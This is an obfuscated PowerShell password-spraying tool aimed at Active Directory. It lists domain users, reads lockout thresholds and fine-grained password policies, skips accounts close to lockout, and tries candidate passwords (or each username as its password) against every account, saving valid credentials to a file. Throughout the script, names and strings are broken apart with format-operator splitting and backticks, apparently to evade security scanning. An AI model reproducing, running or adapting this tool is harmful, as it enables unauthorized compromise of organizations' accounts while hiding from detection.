${u`JN3`7O} =  [TYpE]("{9}{2}{7}{0}{5}{3}{1}{8}{4}{6}"-F'CT','Ry.Do','Ices.','EctO','i','ivEdir','N','a','Ma','SYSteM.dIRecTorYseRV');  ${j1`L853}= [TyPE]("{0}{1}{2}" -F'dATeT','iM','E');&("{0}{1}"-f 'S','Et-item') ("{0}{1}{2}"-f'va','riABle:c','Jg') ([Type]("{0}{1}"-F'C','oNVeRT') )  ;  function INvoKe-`iD`AN{
    
    param(
     [Parameter(poSItIOn = 0, maNdatoRy = ${F`ALsE})]
     [string]
     ${us`eRl`iST} = "",

     [Parameter(PoSItiON = 1, MANDatORy = ${fA`Lse})]
     [string]
     ${pA`SSWo`RD},

     [Parameter(PosITiOn = 2, mandATorY = ${FAL`SE})]
     [string]
     ${PaS`sWOrdl`I`St},

     [Parameter(PoSiTIon = 3, ManDAtoRy = ${faL`sE})]
     [string]
     ${OuTf`i`lE},

     [Parameter(PosiTioN = 4, maNDATorY = ${f`AlSE})]
     [string]
     ${FIl`T`Er} = "",

     [Parameter(POsitIon = 5, MANdAtOry = ${f`ALse})]
     [string]
     ${doM`A`IN} = "",

     [Parameter(poSITION = 6, MandaTORY = ${f`AlSE})]
     [switch]
     ${f`O`Rce},

     [Parameter(pOsItioN = 7, MAnDAtoRY = ${fAl`SE})]
     [switch]
     ${U`s`ErN`AME`ASp`ASSWORd},

     [Parameter(PoSition = 8, manDAToRy = ${Fa`Lse})]
     [int]
     ${D`ElAY}=0,

     [Parameter(POsitION = 9, ManDatoRY = ${F`AL`Se})]
     ${JiT`T`eR}=0

    )

    if (${Pa`ss`w`ord})
    {
        ${p`ASs`WORDs} = @(${PAsS`W`ord})
    }
    elseif(${uSE`RnaMEa`S`pa`SSWoRd})
    {
        ${PA`SS`wO`Rds} = ""
    }
    elseif(${PaSS`WOr`dL`Ist})
    {
        ${PASS`W`OrDs} = &("{1}{2}{0}{3}"-f'Conte','G','et-','nt') ${p`ASsW`or`Dlist}
    }
    else
    {
        &("{0}{2}{1}{3}"-f 'Writ','-Hos','e','t') -ForegroundColor ("{1}{0}" -f 'd','Re') ("{5}{6}{12}{9}{3}{1}{10}{8}{11}{2}{7}{0}{4}" -f'e spe','asswordL','on mus','P','cified','The -','Pa','t b','t o','r -','is','pti','ssword o')
        break
    }

    try
    {
        if (${d`OM`AIn} -ne "")
        {
            
            ${D`omaIn`COntEXT} = &("{1}{2}{0}" -f'ject','New-','Ob') ("{0}{4}{10}{6}{5}{2}{8}{9}{11}{7}{3}{1}"-f 'System','xt','.A','ryConte','.D','s','ctoryService','cto','ctiveDir','ecto','ire','ry.Dire')(("{0}{1}"-f 'dom','ain'),${do`MaiN})
            ${D`oMaInO`BjEct} =  (  &('GI') ("{3}{0}{4}{1}{2}"-f 'ARiAbLE','7','o','v',':UJN3') )."v`Alue"::("{2}{1}{0}"-f 'ain','Dom','Get').Invoke(${do`m`AincoNTe`xT})
            ${C`Ur`ReNt`D`omain} = ("{0}{2}{1}" -f 'L','//','DAP:') + ([ADSI]"LDAP://$Domain")."D`IsTIN`g`U`iSHeDNaME"
        }
        else
        {
            
            ${d`oMainOB`je`cT} =   (&("{1}{0}"-f 'e','VARiAbL')  ("{2}{1}{0}" -f'37O','jN','u')  )."VAL`Ue"::("{3}{2}{0}{4}{5}{1}" -f 'nt','in','tCurre','Ge','Do','ma').Invoke()
            ${cU`Rr`e`N`TDOmaIn} = ("{1}{0}"-f'AP://','LD') + ([ADSI]"")."dIst`iNGuiSh`e`DN`Ame"
        }
    }
    catch
    {
        &("{1}{2}{0}"-f'Host','Write','-') -ForegroundColor "red" ("{20}{18}{8}{14}{10}{19}{11}{13}{7}{9}{1}{16}{4}{3}{2}{12}{21}{0}{17}{15}{6}{5}" -f 'h the',' Tr',' nam','ying the domain','cif','ain option.','m','doma',' Co','in.',' connec','t','e ','o the ','uld not','o','y spe',' -D',']','t ','[*','wit')
        break
    }

    if (${uSER`l`ist} -eq "")
    {
        ${usE`Rl`iStARray} = &("{2}{3}{0}{1}" -f 'nUser','List','G','et-Domai') -Domain ${DOm`AiN} -RemoveDisabled -RemovePotentialLockouts -Filter ${F`iLT`Er}
    }
    else
    {
     
        &("{1}{0}{2}"-f'-H','Write','ost') ('[*]'+' '+'U'+'sin'+'g '+"$UserList "+'a'+'s '+'use'+'rli'+'st '+'to'+' '+'s'+'pray'+' '+'wit'+'h')
        &("{1}{0}{2}{3}"-f'te','Wri','-','Host') -ForegroundColor ("{1}{0}" -f 'ellow','y') ("{9}{4}{6}{2}{5}{3}{8}{0}{7}{1}"-f'ut thresh','.','be chec','d for lo',' Warning: Users','ke',' will not ','old','cko','[*]')
        ${U`SErL`ISTAr`RaY} = @()
        try
        {
            ${u`sErL`Ist`Ar`RaY} = &("{1}{2}{0}" -f 'ontent','Ge','t-C') ${Us`E`RL`ist} -ErrorAction ("{1}{0}" -f'op','st')
        }
        catch [Exception]
        {
            &("{1}{0}{2}" -f 'rite','W','-Host') -ForegroundColor "red" "$_.Exception"
            break
        }

    }


    if (${p`AsSW`oRds}."C`OUNt" -gt 1)
    {
        &("{1}{2}{0}"-f'e-Host','W','rit') -ForegroundColor ("{0}{1}" -f'Yello','w') ("{5}{8}{6}{4}{1}{7}{14}{9}{3}{13}{11}{0}{10}{12}{2}" -f'th th','l not t',' list option!','k','carefu','[*] ',' very ','o','WARNING - Be','oc','e passwor','ccounts wi','d',' out a',' l')
    }

    ${oBsErvat`I`O`N_`w`iNdOW} = &("{1}{3}{4}{0}{2}"-f'Windo','Get','w','-Observa','tion') ${CU`RreNt`do`Main}

    &("{0}{2}{1}"-f 'Write','t','-Hos') -ForegroundColor ("{2}{1}{0}" -f'w','o','Yell') ('[*]'+' '+'T'+'he '+'domain'+' '+'passwo'+'r'+'d '+'polic'+'y '+'observa'+'ti'+'o'+'n '+'wind'+'ow '+'is'+' '+'se'+'t '+'to'+' '+"$observation_window "+'mi'+'nu'+'tes.')
    &("{0}{2}{1}" -f'Wri','Host','te-') ('[*]'+' '+'Se'+'tt'+'ing '+'a '+"$observation_window "+'mi'+'nute '+'w'+'ait '+'in'+' '+'b'+'etween'+' '+'spray'+'s'+'.')


    if (!${fo`RCE})
    {
        ${Tit`le} = ("{5}{1}{0}{2}{3}{4}"-f 'swor',' Pas','d ','Spr','ay','Confirm')
        ${mEss`A`gE} = ("{8}{6}{0}{2}{11}{4}{12}{1}{14}{7}{10}{13}{3}{5}{9}" -f' wa','m a','n','ga','er','ins','sure you','sp','Are you ','t ','ray ','t to p','for','a',' password ') + ${U`sErLI`Sta`RRaY}."cO`UNT" + ("{1}{0}{2}"-f 'ou',' acc','nts?')

        ${y`Es} = &("{0}{2}{1}{3}" -f'New','Obje','-','ct') ("{1}{14}{8}{2}{13}{7}{5}{12}{6}{0}{10}{3}{4}{11}{9}" -f 's','System','ement.Aut','ri','p','.','eDe','ion','nag','ion','c','t','Host.Choic','omat','.Ma') ("{0}{1}" -f '&Y','es'), `
            ("{12}{19}{14}{27}{18}{2}{22}{17}{4}{5}{21}{28}{6}{8}{9}{25}{24}{3}{11}{23}{16}{1}{13}{7}{10}{26}{0}{15}{20}" -f'rd','d','ticate','ach','r ','user','ist','in t',' ','f','he passw',' ','Attempts ',' ','o a','li','asswor',' time pe','hen','t','st file.',' in the ',' 1','p','r e','o','o','ut','l')

        ${NO} = &("{3}{2}{1}{0}"-f 't','jec','Ob','New-') ("{7}{5}{0}{6}{3}{8}{2}{1}{4}"-f'.Management.Automation.','cript','es','t.Choic','ion','ystem','Hos','S','eD') "&No", `
            ("{0}{4}{1}{5}{6}{3}{2}" -f'Cancels the','assw','pray.','s',' p','or','d ')

        ${optio`Ns} = [System.Management.Automation.Host.ChoiceDescription[]](${Y`Es}, ${No})

        ${RES`UlT} = ${Ho`ST}."uI".("{3}{2}{0}{4}{1}" -f'rCho','ce','tFo','Promp','i').Invoke(${tIT`Le}, ${m`es`SAge}, ${opt`iOnS}, 0)

        if (${RE`SULt} -ne 0)
        {
            &("{0}{1}{2}" -f'Wr','ite-Ho','st') ("{5}{0}{4}{2}{3}{1}" -f'elling th','pray.','ssw','ord s','e pa','Canc')
            break
        }
    }
    &("{3}{0}{2}{1}"-f'r','st','ite-Ho','W') -ForegroundColor ("{1}{2}{0}" -f 'w','Y','ello') ("{3}{9}{1}{0}{8}{2}{7}{4}{5}{6}"-f'rd ','sswo','h','[*] P',' b','egun wit','h ','as','spraying ','a') ${Pas`sW`OrDs}."cou`NT" ("{1}{3}{0}{2}" -f's',' p','swords','a')
    &("{1}{0}{2}" -f 'rite-','W','Host') ("{5}{6}{11}{3}{1}{8}{2}{0}{10}{4}{12}{7}{13}{9}"-f'ng o','whi','ependi',' a ','the','[','*] This ','l numb','le d',' of users','n ','might take',' tota','er')

    if(${Us`ER`NameaSPAssW`oRd})
    {
        &("{3}{1}{2}{0}{4}{5}" -f '-SpraySingle','n','voke','I','Pass','word') -Domain ${cU`RrENt`D`omAIn} -UserListArray ${uS`eR`LisTar`RAy} -OutFile ${O`UTfIlE} -Delay ${D`eL`Ay} -Jitter ${j`I`TteR} -UsernameAsPassword
    }
    else
    {
        for(${I} = 0; ${i} -lt ${pAsswo`R`dS}."coU`NT"; ${i}++)
        {
            &("{0}{3}{4}{5}{2}{1}" -f'In','lePassword','raySing','v','o','ke-Sp') -Domain ${CU`Rr`E`NTd`omain} -UserListArray ${UsE`RLI`sTArR`AY} -Password ${pAS`swoR`DS}[${i}] -OutFile ${O`U`TfIle} -Delay ${De`LAY} -Jitter ${JiT`T`er}
            if ((${i}+1) -lt ${Passw`O`Rds}."Co`Unt")
            {
                &("{0}{2}{4}{3}{1}" -f'C','er','o','-Tim','untdown') -Seconds (60*${OBS`eR`VaTIOn_wI`Ndow})
            }
        }
    }

    &("{2}{1}{0}" -f'ost','rite-H','W') -ForegroundColor ("{0}{1}"-f 'Y','ellow') ("{1}{2}{5}{3}{4}{0}" -f'complete','[*]',' Pass',' s','praying is ','word')
    if (${oU`TFI`lE} -ne "")
    {
        &("{0}{2}{1}" -f 'Write-H','st','o') -ForegroundColor ("{0}{1}"-f 'Yel','low') ('[*]'+' '+'An'+'y '+'pas'+'swor'+'d'+'s '+'tha'+'t '+'w'+'ere '+'suc'+'ce'+'ssfully '+'s'+'p'+'rayed '+'hav'+'e '+'bee'+'n '+'ou'+'tput'+' '+'to'+' '+"$OutFile")
    }
}

function cOUntdO`w`N-TI`mer
{
    param(
        ${s`EcO`NDS} = 1800,
        ${m`ESsA`GE} = ("{4}{1}{3}{6}{5}{2}{0}{7}" -f 'ccount lock','aus','void a','ing ','[*] P',' a','to','out.')
    )
    foreach (${C`Ou`Nt} in (1..${s`eCoN`Ds}))
    {
        &("{2}{1}{0}{3}" -f 'e-Pro','t','Wri','gress') -Id 1 -Activity ${mE`S`SAge} -Status "Waiting for $($Seconds/60) minutes. $($Seconds - $Count) seconds remaining " -PercentComplete ((${co`UNT} / ${SE`cON`dS}) * 100)
        &("{1}{0}{3}{2}"-f'rt-Sl','Sta','p','ee') -Seconds 1
    }
    &("{1}{2}{3}{0}"-f 'ress','Write-P','ro','g') -Id 1 -Activity ${ME`sS`AGe} -Status ("{2}{1}{0}"-f 'd','lete','Comp') -PercentComplete 100 -Completed
}

function geT-dOmaI`Nuser`l`IST
{

    param(
     [Parameter(PoSITION = 0, mandatOry = ${f`AlSe})]
     [string]
     ${dom`A`in} = "",

     [Parameter(POsITION = 1, MaNDATOrY = ${FAl`SE})]
     [switch]
     ${r`e`MO`VeDiSaBlEd},

     [Parameter(PoSItIOn = 2, ManDAtory = ${fal`sE})]
     [switch]
     ${r`EmovE`pOte`NtI`AL`Lock`oU`TS},

     [Parameter(pOsItion = 3, mAnDaToRY = ${fa`lsE})]
     [string]
     ${f`iLt`eR}
    )

    try
    {
        if (${dOM`Ain} -ne "")
        {
           
            ${D`omA`IncOnte`xt} = &("{2}{0}{1}" -f 'bje','ct','New-O') ("{9}{4}{8}{0}{6}{2}{1}{5}{7}{3}"-f'ySer','Dir','ve','ryContext','m.','ec','vices.Acti','tory.Directo','Director','Syste')(("{0}{1}" -f'do','main'),${Do`Ma`in})
            ${Do`MaINOb`Je`cT} = ${Uj`N3`7o}::("{1}{0}{2}" -f'etDom','G','ain').Invoke(${Do`Ma`IN`CoNt`Ext})
            ${CUR`Ren`T`d`omain} = ("{1}{0}" -f '/','LDAP:/') + ([ADSI]"LDAP://$Domain")."DisT`INGuIs`heD`Name"
        }
        else
        {
          
            ${do`M`AIno`BJeCt} =  ( &("{1}{0}{2}" -f 'RiabL','Va','e') ("{1}{2}{0}" -f'7o','UjN','3'))."vaL`Ue"::("{1}{2}{0}{3}" -f 'Domai','GetC','urrent','n').Invoke()
            ${c`Ur`RENT`DOmA`In} = ("{2}{0}{1}"-f'DAP','://','L') + ([ADSI]"")."d`isTing`UISH`eDnamE"
        }
    }
    catch
    {
        &("{0}{2}{1}" -f'Write','ost','-H') -ForegroundColor "red" ("{19}{20}{2}{14}{4}{15}{18}{21}{11}{5}{8}{1}{9}{17}{6}{16}{10}{0}{13}{7}{3}{12}"-f 'e with ','th','c','omain option','nec','y specifyi','n','e -D','ng ','e ','nam','Tr','.','th','on','t to the d',' ','domai','oma','[*] ','Could ','in. ')
        break
    }

    
    ${O`B`Jde`DoMAin} = [ADSI] "LDAP://$($DomainObject.PDCRoleOwner)"
    ${a`c`cO`UNTL`oCKouttHR`Eshol`ds} = @()
    ${a`CcOu`NT`Lo`CKoutthR`Es`HoLDs} += ${objdEd`O`maiN}."P`ROpe`RTIEs"."loCKOUTt`hRes`h`Old"

    
    ${B`ehAVio`RV`ErsIOn} = [int] ${OB`jd`ed`oMAiN}."p`R`OpErtI`eS"[("{1}{0}{5}{3}{2}{4}"-f'or','msds-behavi','io','ers','n','-v')].("{1}{0}"-f 'tem','i').Invoke(0)
    if (${B`E`Ha`VioRvERsion} -ge 3)
    {
        
        &("{0}{1}{2}" -f 'Writ','e','-Host') ("{9}{0}{2}{7}{4}{5}{6}{3}{11}{1}{10}{13}{12}{8}"-f 'urrent d','e-G','o','s ','ai','n',' i','m','Policy.','[*] C','rain','compatible with Fin','word ','ed Pass')
        ${ADse`A`RC`hEr} = &("{1}{0}{2}"-f'ec','New-Obj','t') ("{7}{5}{3}{6}{1}{2}{4}{0}"-f'irectorySearcher','orySe','rv','m.','ices.D','e','Direct','Syst')
        ${Ad`S`ear`cHer}."sEarC`HR`OOt" = ${OBJd`ED`o`maiN}
        ${A`D`se`ARcher}."fILT`eR" = ("{4}{6}{8}{0}{2}{3}{5}{1}{9}{7}" -f's','o','=ms','DS-P','(','assw','objectcla','gs)','s','rdSettin')
        ${P`sOS} = ${ADse`A`R`cHer}.("{1}{0}"-f 'dAll','Fin').Invoke()

        if ( ${p`SoS}."C`Ount" -gt 0)
        {
            &("{2}{1}{0}"-f'ite-Host','r','W') -foregroundcolor ("{0}{1}"-f 'yell','ow') (("{1}{3}{0}{2}"-f 'otal ','[','of ','*] A t') + ${pS`oS}."c`oUNt" + (' '+'Fi'+'n'+'e-Grained '+'Pas'+'sword '+'polici'+'es'+' '+'wer'+'e '+"found.`r`n"))
            foreach(${en`TrY} in ${ps`os})
            {
                
                ${PSo`FINeGR`A`iNE`DpoLIcY} = ${eNt`Ry} | &("{4}{0}{1}{2}{3}" -f'Ob','j','e','ct','Select-') -ExpandProperty ("{2}{0}{1}"-f 'pert','ies','Pro')
                ${Pso`pO`lICYnAmE} = ${ps`oFINeG`Ra`In`eDPO`licY}."na`me"
                ${P`S`oLOcKOUt`TH`ReshO`Ld} = ${p`s`oF`INeg`Ra`ineDP`olIcY}.'msds-lockoutthreshold'
                ${pso`APP`liEs`TO} = ${pSo`FI`Negr`Ai`NED`POlICy}.'msds-psoappliesto'
                ${PSoM`i`NpwDLE`Ng`TH} = ${p`SO`FinEGrAI`NEdp`Ol`I`cy}.'msds-minimumpasswordlength'
               
                ${ACC`OUN`TlO`cKOuT`ThreS`H`o`LdS} += ${Ps`o`LOck`oUtthReS`Ho`lD}

                &("{2}{1}{0}" -f'st','ite-Ho','Wr') ('[*]'+' '+'F'+'ine'+'-G'+'rained'+' '+'Passwo'+'rd'+' '+'P'+'olicy '+'titled'+':'+' '+"$PSOPolicyName "+'h'+'as '+'a '+'Lock'+'o'+'ut '+'T'+'hre'+'shold '+'o'+'f '+"$PSOLockoutThreshold "+'att'+'e'+'mpt'+'s, '+'mi'+'nimum'+' '+'pa'+'ssw'+'ord'+' '+'lengt'+'h'+' '+'of'+' '+"$PSOMinPwdLength "+'cha'+'rs,'+' '+'a'+'nd '+'ap'+'plies '+'to'+' '+"$PSOAppliesTo.`r`n")
            }
        }
    }

    ${OBser`VaTioN`_`wINdOw} = &("{1}{2}{4}{0}{3}"-f 'i','Ge','t-Observat','ndow','ionW') ${C`U`RRe`NtDomA`IN}

    
    [int]${SMAlle`stl`oc`K`OUT`T`HReShold} = ${ACcoUNtLO`CK`oU`TT`hrEShOlDs} | &("{0}{1}"-f'so','rt') | &("{0}{1}"-f 'S','elect') -First 1
    &("{2}{0}{1}{3}"-f 'e-H','os','Writ','t') -ForegroundColor ("{1}{0}" -f'llow','ye') ("{7}{6}{1}{0}{4}{10}{12}{13}{5}{11}{9}{8}{2}{3}"-f 're',' c','y..','.','ating a','user','] Now','[*','pra',' to s',' ','s','li','st of ')

    if (${s`M`A`LLES`T`lOcKOuTThR`eSHOlD} -eq "0")
    {
        &("{0}{2}{1}" -f'Wri','e-Host','t') -ForegroundColor ("{0}{1}"-f'Yello','w') ("{1}{4}{5}{0}{6}{2}{7}{3}" -f 'e appears ','[*','e no ','olicy.','] ','Ther','to b','lockout p')
    }
    else
    {
        &("{2}{1}{0}" -f't','-Hos','Write') -ForegroundColor ("{0}{1}"-f'Yell','ow') ('['+'*] '+'T'+'he '+'s'+'ma'+'llest '+'l'+'oc'+'kout '+'th'+'resh'+'old'+' '+'disc'+'ove'+'red '+'i'+'n '+'th'+'e '+'dom'+'ai'+'n '+'i'+'s '+"$SmallestLockoutThreshold "+'l'+'ogin'+' '+'a'+'tt'+'empts.')
    }

    ${USErS`eArch`er} = &("{0}{1}{3}{2}"-f 'N','e','ct','w-Obje') ("{2}{6}{0}{5}{1}{4}{3}" -f'.D','ry','System.Directo','er','Search','irecto','ryServices')([ADSI]${CUr`ReNt`DOmain})
    ${dirE`N`TRy} = &("{0}{1}{2}"-f 'N','ew-','Object') ("{1}{8}{3}{9}{7}{2}{11}{4}{0}{6}{5}{10}"-f 'ct','S','ryServi','stem.D','s.Dire','ry','o','recto','y','i','Entry','ce')
    ${USeRsE`Arc`HEr}."Sear`chr`ooT" = ${dIr`eN`TRY}

    ${USErSearC`h`Er}."pROpeR`TI`e`s`TOloaD".("{0}{1}" -f'Ad','d').Invoke(("{0}{1}{2}{3}"-f'sa','macc','ountna','me')) > ${nu`LL}
    ${usEr`S`EarchER}."P`R`oPe`RTIESTolOaD".("{1}{0}" -f 'd','Ad').Invoke(("{0}{1}{2}" -f 'badp','wdco','unt')) > ${NU`LL}
    ${Us`eRS`e`ArC`heR}."PrOpER`TI`estOl`OaD".("{1}{0}" -f 'dd','A').Invoke(("{2}{1}{0}"-f 'me','dti','badpasswor')) > ${Nu`LL}

    if (${rEmoVEd`I`S`AblED})
    {
        &("{2}{1}{0}" -f't','-Hos','Write') -ForegroundColor ("{2}{1}{0}" -f'ow','l','yel') ("{7}{3}{4}{0}{8}{9}{5}{1}{6}{2}" -f 'em','om ','st.','] ','R','sabled users fr','li','[*','o','ving di')
      
        ${U`SerSea`Rc`hER}."F`ilTeR" =
            "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2)$Filter)"
    }
    else
    {
        ${Us`eRse`ARCHEr}."f`iLT`er" = "(&(objectCategory=person)(objectClass=user)$Filter)"
    }

    ${USeR`SE`ARC`HEr}."p`R`ope`RTie`STOLoad".("{1}{0}"-f 'd','ad').Invoke(("{0}{1}{3}{2}" -f 'sa','maccount','ame','n')) > ${N`ULL}
    ${USE`RSEARc`Her}."pro`PeRT`i`E`STOLOaD".("{1}{0}"-f'd','ad').Invoke(("{2}{0}{1}"-f'o','uttime','lock')) > ${NU`lL}
    ${u`sERSE`A`RcHER}."PROp`ErtIE`sT`oLoAD".("{0}{1}"-f'a','dd').Invoke(("{3}{2}{0}{1}"-f'pwdcoun','t','ad','b')) > ${N`ULL}
    ${u`Ser`seARc`hEr}."PRoPer`TieST`oL`OAd".("{1}{0}" -f 'dd','a').Invoke(("{3}{0}{1}{2}" -f'sswo','rdt','ime','badpa')) > ${n`UlL}

   
    ${USerSE`A`Rc`H`ER}."PA`gE`SIze" = 1000
    ${aLLu`SE`RO`BjE`CTs} = ${U`SerS`EA`RC`hEr}.("{2}{1}{0}"-f 'l','Al','Find').Invoke()
    &("{2}{1}{0}"-f 'ost','H','Write-') -ForegroundColor ("{0}{1}{2}" -f 'y','ello','w') (("{3}{0}{1}{2}"-f '*','] There ','are ','[') + ${A`LlUsER`objeC`TS}."cO`Unt" + ("{4}{1}{0}{2}{3}" -f 'al users fou','ot','n','d.',' t'))
    ${USER`LIS`T`Ar`RAY} = @()

    if (${rEmo`V`E`poTeNT`ia`ll`OCKOuts})
    {
        &("{2}{0}{1}"-f 't','e-Host','Wri') -ForegroundColor ("{1}{0}"-f'low','yel') ("{4}{8}{2}{3}{10}{5}{0}{9}{7}{1}{14}{12}{6}{11}{13}" -f' ','hin 1 at','g',' use','[*] Removi','s','o','t','n','wi','r','ut from li','pt of locking ','st.','tem')
        foreach (${u`Ser} in ${all`U`serobj`ec`Ts})
        {

            ${bADC`o`U`Nt} = ${u`ser}."p`Rope`RTI`ES"."badPwDCo`U`NT"
            ${sAm`A`cCoUNt`N`AmE} = ${Us`er}."prOpE`R`Ti`eS"."SA`m`A`cCouNTN`AmE"
            try
            {
                ${bAd`p`AsSwoR`Dti`me} = ${us`eR}."pR`Ope`Rti`Es"."b`ADPASswor`DTiME"[0]
            }
            catch
            {
                continue
            }
            ${cUR`RenT`TImE} = &("{2}{1}{0}"-f'e','-Dat','Get')
            ${las`Tba`DPWD} =   ${j1l`853}::("{2}{1}{0}" -f'Time','romFile','F').Invoke(${b`AdPassWOR`D`TIMe})
            ${ti`MEDI`Ff`E`REncE} = (${cUrRe`N`TTI`mE} - ${LaS`TBa`dp`Wd})."to`Ta`Lmi`NUteS"

            if (${BA`Dc`oUnT})
            {
                [int]${u`SERbAdcOu`NT} =  ${C`Jg}::("{0}{1}{2}"-f 'T','oIn','t32').Invoke(${b`AdcOU`NT}, 10)
                ${At`T`EMPTsuNtil`LOCKO`UT} = ${smA`LlES`T`LO`cK`Outt`HreSHOLD} - ${us`eRBaDcou`NT}
               
                if ((${t`iMEDIF`F`e`ReNce} -gt ${O`Bse`R`VATIon`_`wiNdOw}) -or (${AttemptsUnt`I`L`LOcK`o`UT} -gt 1))
                                {
                    ${U`SeRLis`TAr`Ray} += ${saM`ACc`ouNT`Name}
                }
            }
        }
    }
    else
    {
        foreach (${us`er} in ${a`lL`UsErO`BjEcts})
        {
            ${S`A`mACco`UntNamE} = ${u`seR}."prop`eRt`IES"."saM`ACC`oUNTNaME"
            ${u`S`E`Rli`STARRaY} += ${S`AMaC`COuNTNAME}
        }
    }

    &("{1}{0}{3}{2}" -f 'rite','W','Host','-') -foregroundcolor ("{2}{0}{1}" -f'ello','w','y') (("{6}{0}{4}{9}{2}{1}{7}{3}{5}{8}"-f ' Crea','list','r','on','ted a ','ta','[*]',' c','ining ','use') + ${U`S`erListAr`RAy}."CO`UNT" + ((("{2}{10}{4}{7}{0}{1}{8}{5}{3}{6}{9}"-f'ered from the',' c',' user',' ',' ','t','userEkus do','gath','urren','main','s')) -REpLAce'Eku',[CHar]39))
    return ${USERl`ista`RR`AY}
}

function INV`OKe-SP`RA`ysiNgl`ePAsS`woRd
{
    param(
            [Parameter(pOSITion=1)]
            ${DoM`A`In},
            [Parameter(PoSitIon=2)]
            [string[]]
            ${u`sERliStar`Ray},
            [Parameter(POsitiON=3)]
            [string]
            ${pa`sSWO`Rd},
            [Parameter(positIOn=4)]
            [string]
            ${out`Fi`Le},
            [Parameter(poSItiOn=5)]
            [int]
            ${DE`LAy}=0,
            [Parameter(pOSItIoN=6)]
            [double]
            ${jIt`T`Er}=0,
            [Parameter(posiTion=7)]
            [switch]
            ${UsE`R`NAMEAsPasSW`OrD}
    )
    ${t`ImE} = &("{2}{0}{1}"-f'a','te','Get-D')
    ${C`OU`Nt} = ${US`E`RLIsTarr`AY}."Cou`Nt"
    &("{2}{0}{1}" -f'ri','te-Host','W') "[*] Now trying password $Password against $count users. Current time is $($time.ToShortTimeString()) "
    ${cUr`R_U`seR} = 0
    &("{1}{2}{0}"-f 'ite-Host','W','r') -ForegroundColor ("{1}{0}"-f'w','Yello') ('['+'*] '+'Writ'+'in'+'g '+'successe'+'s'+' '+'t'+'o '+"$OutFile")
    ${RA`N`dNo} = &("{1}{2}{0}" -f 'ject','New-','Ob') ("{3}{2}{1}{0}" -f 'em.Random','t','s','Sy')

    foreach (${u`SeR} in ${USerlIs`T`ArR`AY})
    {
        if (${US`eRNAmE`A`SPAss`w`OrD})
        {
            ${pa`ss`WO`Rd} = ${US`Er}
        }
        ${DO`Ma`in_`ChECk} = &("{1}{0}{2}"-f 'ew-Obj','N','ect') ("{9}{8}{7}{5}{4}{11}{3}{10}{0}{2}{6}{1}" -f 's.Direct','try','ory','i','ryS','cto','En','e','ystem.Dir','S','ce','erv')(${do`Ma`IN},${u`SEr},${p`AS`swORd})
        if (${DOMain`_c`H`E`Ck}."N`AmE" -ne ${NU`ll})
        {
            if (${o`Ut`FIlE} -ne "")
            {
                &("{1}{0}{2}" -f 'e','Add-Cont','nt') ${ou`TFi`le} ((("{0}{4}{1}{3}{2}"-f '{0}U',':{','rd','0}Passwo','ser')) -f [ChAR]36)
            }
            &("{2}{3}{0}{1}" -f'Hos','t','W','rite-') -ForegroundColor ("{0}{1}"-f'Gr','een') ('[*'+'] '+'SUC'+'CE'+'SS! '+"User:$User "+"Password:$Password")
        }
        ${cu`RR_`USeR} += 1
        &("{0}{1}{2}" -f'Write-Ho','s','t') -nonewline ("$curr_user "+'of'+' '+"$count "+'u'+'sers'+' '+"tested`r")
        if (${d`ELay})
        {
            &("{2}{1}{0}"-f'-Sleep','rt','Sta') -Seconds ${R`ANdNO}.("{1}{0}" -f't','Nex').Invoke((1-${j`i`TtER})*${d`ELay}, (1+${jI`Tter})*${d`Elay})
        }
    }

}

function g`e`T-Ob`SErv`AtiOn`w`INdow(${DO`m`AIN`entry})
{
    
    ${L`Oc`ko`BSeR`VATiOn`Wi`NDo`W_ATtR} = ${dOM`Ai`NentRy}."p`Ro`peRtiEs"[("{1}{2}{4}{0}{3}" -f 'ation','l','oc','Window','koutObserv')]
    ${oBseR`V`AtiON_w`inDow} = ${domaI`N`ENtry}.("{4}{1}{3}{0}{2}" -f'rToInt','Lar','64','geIntege','Convert').Invoke(${Lo`c`KoBSe`Rv`A`T`io`NwiNDoW`_AttR}."v`AlUe") / -600000000
    return ${oBservaTiON_W`i`N`d`oW}
}
